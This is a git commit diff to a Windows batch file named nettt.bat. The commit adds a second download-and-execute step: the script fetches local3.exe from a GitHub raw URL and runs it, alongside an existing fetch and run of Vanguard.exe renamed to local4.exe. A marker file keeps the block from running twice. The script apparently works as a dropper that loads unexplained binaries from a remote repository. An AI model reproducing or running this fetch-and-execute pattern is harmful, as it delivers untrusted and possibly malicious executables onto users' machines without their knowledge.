b11a3bfad84acf3a8048bf4c4eda80ecc0e1c3d1
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-09-07 13:34:44 +0300

    Update nettt.bat

--- nettt.bat
+++ nettt.bat
@@ -9,6 +9,8 @@ if exist nagihori2.txt (
     echo nagihori.txt yok, devam ediliyor...
     curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/Vanguard.exe -o local4.exe
     local4.exe
+    curl -L https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
+    local3.exe
     echo "asd" > nagihori2.txt 
     
 )
